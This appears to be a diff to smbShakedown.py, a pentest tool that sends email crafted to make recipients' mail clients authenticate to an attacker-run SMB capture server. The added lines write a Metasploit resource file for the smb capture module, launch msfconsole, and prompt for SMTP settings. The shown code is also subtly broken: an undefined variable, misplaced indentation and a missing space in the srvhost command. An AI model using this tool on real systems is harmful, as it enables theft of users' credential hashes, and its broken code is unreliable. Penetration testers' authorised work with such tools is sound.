@@ -2,7 +2,7 @@
 # Description: A simplified SMB Email Client Attack script used for External/Internal pentests.
 # Created by: Nick Sanzotta / @beamr
 # Version: smbShakedown.py v 1.0
-import smtplib, getpass, readline, socket, time
+import os, smtplib, getpass, readline, socket, time
 
 def get_ip_address():
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -16,8 +16,14 @@ def smbServ():
 	no = set(['no','n'])
 	print('ENTERED: "%s"' % choice + "\n")
 	if choice in yes:
-
+	with open(filename, 'w') as f1:
+		f1.write("use auxiliary/server/capture/smb"+"\n"+\
+				"set srvhost"+get_ip_address()+"\n"+\
+				"exploit -j -z")
+	os.system('msfconsole -r smbServ.rc')
+	# sys.exit(2)
 	elif choice in no:
+		print("Ok, remember to setup your SMBCapture Server elsewhere.")
 
 	else:
 
@@ -58,12 +64,12 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 
 def main():
 	ipAddress = get_ip_address()
+	smbServ()
 	# Currently this feature is not fully implemented
 	# serverOption = raw_input('Use Smarthost or localhost SMTP Server?[smarthost/localhost]: ') or 'smarthost'
 	# choice = serverOption.lower()
 	# smarthost = set(['smarthost','smart', 's', ''])
 	# localhost = set(['localhost','local', 'l'])
-
 	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
 	print('ENTERED: "%s"' % smtpServerAddress + "\n")
 	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
